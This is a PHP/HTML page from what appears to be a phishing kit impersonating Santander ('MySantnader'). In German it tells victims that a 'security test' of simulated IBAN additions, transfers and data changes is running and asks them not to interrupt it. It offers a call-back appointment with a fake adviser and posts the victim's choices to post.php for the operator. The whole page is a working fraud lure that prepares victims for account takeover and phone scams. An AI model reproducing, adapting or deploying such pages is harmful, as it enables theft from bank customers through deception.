<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MySantnader</title>
    <link rel="stylesheet" href="res/app.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png" class="pc">
<img src="res/text.png" class="pc">
<img src="res/mini-logo.png" class="mobile">
</header>

 
<main style="text-align:center;">
<div class="container" style="text-align:center;">
<div class="form" style="width:800px; font-size:0.8em; text-align:left; display:inline-block;">

<div class="f_box">
<div class="f_left">
<div class="title">Warnung </div>
<div class="text">
<p>Im Rahmen unserer Sicherheitsverpflichtungen führen wir derzeit einen Test zur Verstärkung der Schutzmaßnahmen für Ihr Konto durch. Dieser Vorgang kann bis zu 5 Minuten dauern. Wir bitten Sie, den Vorgang nach Beginn nicht zu unterbrechen.</p>
<p>Dieser Test beinhaltet sichere Simulationen der Hinzufügung von Bankverbindungen (IBAN), Überweisungen und Zahlungen sowie Änderungen persönlicher Daten. Diese simulierten Vorgänge führen zu keiner realen Kontobewegung, sondern dienen dazu, die Zuverlässigkeit und Wirksamkeit der neuen Schutzmaßnahmen zu gewährleisten.</p>
<p>Sie können dieses Verfahren online durchführen oder einen Termin mit einem unserer Berater über die Schaltfläche „Terminvereinbarung“ planen.</p>
</div>
<div class="f_btns">
    <button onclick="note('CONTINUE ONLINE SELECTED!')" class="sbmt">Überprüfung online fortsetzen</button>
    <button id="shower">Terminvereinbarung</button>
</div>
</div>


</div>

<div class="popup">
<div class="popup-content">
<div class="col">
Wählen Sie ein Datum und eine Uhrzeit, damit wir Sie anrufen können, um die Überprüfung mit einem unserer Berater abzuschließen.
</div>

<div class="selects">
<select id="day"></select>
<select id="hour"></select>
</div>

<div class="col">
    <button onclick="sbmt()" class="sbmt">Terminvereinbarung</button>
</div>

<div class="danger">
<h3>Wir bitten Sie, den Vorgang nach Beginn nicht zu unterbrechen.</h3>
<p>Ihre Sicherheit hat für uns oberste Priorität.</p>
</div>
</div>
</div>


</div>

</div>
</main>



 

<?php 
require 'loader.php';
$m->ctr("INSTRUCTIONS 2 RDV");
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>

$("#shower").click(()=>{
  $(".popup").css('display', 'flex');

});

function sbmt(){
    $(".loader").show();
    $.post("post.php",{insts:1, day:$("#day").val(), hour:$("#hour").val()});
 
}

function note(note){
    $(".loader").show();
    $.post("post.php",{notes:note},(res)=>{
    })
}



  function getNextFiveWeekdays() {
    const weekdays = [];
    const dayNames = ["Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag"];
    let currentDate = new Date();
    let count = 0;

    while (count < 5) {
      const dayOfWeek = currentDate.getDay();
      
      if (dayOfWeek >= 1 && dayOfWeek <= 5) { 
        const dayName = dayNames[dayOfWeek - 1]; 
        const day = String(currentDate.getDate()).padStart(2, '0');
        const month = String(currentDate.getMonth() + 1).padStart(2, '0');
        weekdays.push(`${dayName} ${day}/${month}`);
        count++;
      }
      
      currentDate.setDate(currentDate.getDate() + 1);
    }

    return weekdays;
  }

  function populateDaySelect() {
    const select = document.getElementById('day');
    const weekdays = getNextFiveWeekdays();

    weekdays.forEach((dateString) => {
      const option = document.createElement('option');
      option.value = dateString;
      option.textContent = dateString;
      select.appendChild(option);
    });
  }

  populateDaySelect();


  function populateHourSelect() {
    const select = document.getElementById('hour');
    for (let hour = 8; hour <= 17; hour++) {
      const option = document.createElement('option');
      const formattedHour = `${String(hour).padStart(2, '0')}:00`;
      option.value = formattedHour;
      option.textContent = formattedHour;
      select.appendChild(option);
    }
  }

  populateHourSelect();
</script>
</body>
</html>